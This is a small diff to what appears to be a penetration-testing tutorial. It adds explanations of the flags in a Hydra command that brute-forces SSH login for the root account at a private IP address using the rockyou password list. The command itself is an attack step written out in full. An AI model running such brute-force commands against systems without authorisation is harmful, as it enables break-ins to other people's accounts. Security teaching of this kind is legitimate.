@@ -23,3 +23,11 @@
 
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.105
+
+
+-l: Login username
+
+-P: Password list
+
+ssh://: Protocol and target IP
+
